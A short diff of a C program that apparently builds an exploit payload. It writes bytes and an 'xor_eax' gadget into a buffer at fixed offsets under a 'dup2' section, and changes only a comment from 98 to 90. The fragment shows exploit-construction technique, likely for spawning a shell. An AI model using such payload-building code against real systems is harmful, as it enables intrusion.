@@ -207,7 +207,7 @@ int main(void)
   // 4 byte value 16
   strcpy(bufr + 383, "\x01\x01\x01\x01");
   //---------------------------------------------------------------------------------------------- dup2
-  // put 98 into eax
+  // put 90 into eax
   // clear eax
   strcpy(bufr + 387, xor_eax); // 0xbba9b3c2
   // put seed into edx
